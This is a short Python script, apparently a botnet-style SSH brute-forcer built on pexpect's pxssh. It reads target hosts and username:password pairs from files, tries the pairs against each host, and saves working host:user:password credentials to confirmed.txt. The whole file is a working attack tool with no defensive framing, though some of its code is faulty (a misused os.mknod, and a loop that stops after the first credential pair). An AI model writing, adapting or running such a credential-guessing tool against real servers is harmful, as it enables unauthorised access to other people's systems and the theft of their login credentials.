from pexpect import pxssh
from threading import *
import os
screen_lock = Semaphore(value=1)


class Bot:
    def __init__(self, target, user, pw):
        self.host = target
        self.user = user
        self.password = pw
        self.session = self.ssh_login()

    def ssh_login(self):
        """
        Attempts logging in with. If successful, credentials are appended to confirmed.txt if not already there
        and associated with the specific target IP.
        :return: bool
        """
        try:
            bot = pxssh.pxssh()
            bot.login(self.host, self.user, self.password)
            path = "./confirmed.txt"
            mode = "a+" if os.path.exists(path) else os.mknod(path)
            with open(path, "r+") as r:
                """
                Opens or creates the hosts.txt file in read mode, checks the addresses (if any).
                Changes the value of append to False if address is found.
                Appends the address to hosts.txt if append still True after file is read.
                """
                append = True
                for item in r.readlines():
                    if "{}:{}:{}".format(self.host, self.user, self.password) in item:
                        append = False
                if append:
                    with open("confirmed.txt", "a+") as w:
                        w.seek(0)
                        w.write("{}:{}:{}".format(self.host, self.user, self.password))
                        w.write("\n")
            return bot
        except Exception as e:
            print("[-] Error connecting\n{}".format(e))


def brute():
    with open("hosts.txt", "r") as hosts:
        for host in hosts:
            with open("creds.txt", "r") as creds:
                for cred in creds:
                    un = cred.strip("\n").split(":")[0]
                    pw = cred.strip("\n").split(":")[1]
                    if Bot(host.strip("\n"), un, pw):
                        break


brute()


